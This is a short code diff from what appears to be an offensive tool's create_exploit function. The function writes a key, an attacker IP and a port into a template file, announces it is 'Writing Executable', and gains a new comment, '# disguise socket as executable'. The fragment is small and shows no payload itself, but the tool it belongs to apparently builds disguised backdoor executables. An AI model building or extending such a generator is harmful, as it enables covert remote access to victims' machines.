@@ -197,13 +197,15 @@ def create_exploit():
         for i, line in enumerate(get_all, 1):
             if i == 14:
                 f.writelines("    key = " + str(current_key) + "\n")
-            elif i == 57:
+            elif i == 55:
                 f.writelines("      ip =" + "'" + ip + "'" + "\n")
-            elif i == 58:
+            elif i == 56:
                 f.writelines("      port = " + port + "\n")
             else:
                 f.writelines(line)
     print(CBLU + "[+] Writing Executable..." + CEND)
+    # disguise socket as executable
+
     print("File Saved")
     menu()
 
